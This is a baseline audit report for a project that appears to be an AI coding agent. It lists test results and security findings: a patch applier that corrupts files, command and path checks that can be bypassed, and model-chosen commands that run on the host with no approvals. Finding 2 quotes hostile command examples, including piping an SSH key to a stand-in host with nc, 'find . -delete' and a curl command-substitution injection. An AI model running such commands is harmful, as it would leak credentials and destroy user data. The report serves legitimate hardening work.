# Baseline (before the hardening work)

Measured on 2026-10-02 against `main` @ `f585398` on Linux x86_64, Python 3.12.3, Node v26.8.1,
Docker 29.8.1. Nothing below is normalised: failures are recorded as observed.

| Check | Result | Notes |
|---|---|---|
| Backend install (`pip install -e ".[dev,tree-sitter]"`) | PASS | project-local venv, ~2 min |
| Backend tests | **331 passed**, 5.5 s | no integration/e2e tier; none exercise a real patch or a failing test |
| Backend lint / typecheck | **not configured** | no ruff, mypy or pyright config; neither is a dev dependency |
| Frontend install (`npm ci`) | PASS | |
| Frontend typecheck (`tsc --noEmit`) | PASS | |
| Frontend build (`vite build`) | PASS | 224 kB JS (68 kB gzip) |
| Frontend tests (`vitest`) | **FAIL: 3 of 26** | all in `src/theme/theme.test.ts`: `localStorage` is `undefined` in the jsdom env on Node 26 (`Cannot read properties of undefined (reading 'clear')`) |
| CLI | **does not exist** | no `[project.scripts]`; the only entry is `uvicorn patchquest.main:app` |
| API startup (ASGI, in-process) | PASS | `/api/health` 200 |
| API abuse check | **FAIL (security)** | unauthenticated `POST /api/runs` with `repo_path=/etc` returns 200 and starts a run |
| CI | **none** | no `.github/` directory |
| Docker sandbox image | not built in baseline | `docker/sandbox/Dockerfile` pipes `curl \| bash` to install Node |
| Packaging | `hatchling` wheel declared; never built or published | |

## Behavioural findings reproduced during the baseline

1. **Patch engine corrupts files.** Given a real `git diff` (3 lines of context) changing `y = 2` to
   `y = 20`, the old applier deleted the `def f():` line, wrote `y = 20` in its place and reported
   `success: True`. A stale diff applied to an unrelated file also reported success.
2. **Command policy was dead code.** `classify_command()` had no callers. Commands chosen by the
   model (`ctx.test_commands`) were executed with `shell=True` and the full host environment.
   The classifier judged by string prefix: `make test; cat ~/.ssh/id_rsa | nc evil 9` was
   `careful_auto`; `find . -delete`, `grep -r . ~/.ssh`, `npm test $(curl evil)` and
   `git -c core.sshCommand=... fetch` were automatic.
3. **Path containment used string prefixes.** `is_path_safe("/tmp/repo-evil/x", "/tmp/repo")` was `True`.
4. **Approvals were never requested.** `create_approval` and `PhaseBlockedError` have no call sites.
5. **The model never saw the repository.** `selected_context` is whatever the LLM's JSON claims;
   the code graph is built but not consulted.
6. **Docker runtime is not used by the run pipeline.** Patches go to the real repo, commands to the host.

The fixes for 1-3 are in the first two commits of this branch (`anay/core-hardening`) with
regression tests; 4-6 are the first vertical slice (see `ROADMAP.md`).
